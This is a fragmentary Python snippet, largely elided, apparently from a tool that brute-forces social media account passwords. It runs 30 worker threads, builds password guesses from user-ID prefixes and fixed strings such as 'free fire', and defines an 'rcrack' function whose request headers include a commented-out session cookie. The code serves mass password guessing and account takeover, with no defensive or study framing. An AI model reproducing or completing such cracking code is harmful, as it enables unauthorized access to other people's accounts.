...
def random_number():
	...
	with ThreadPool(max_workers=30) as yaari:
		...
		for guru in user:
			...
			mk = uid[:6]
			pwx = [guru]
			pwx = [kode+guru,mk,'57273200','57575751','free fire']
...
def rcrack(uid,pwx,tl):
    ...
    # 'cookie': 'datr=Rk8cZcpwspBXHYPV3gTMpSSO; sb=Rk8cZZAQDMPs02thoXKa3-XD; m_pixel_ratio=2.75; wd=393x682; fr=0wKfRfqwKuN8oopYz..BlHE9G.h-.AAA.0.0.BlHE9R.AWVAYa0yCsI',
    'dpr': '2.75',
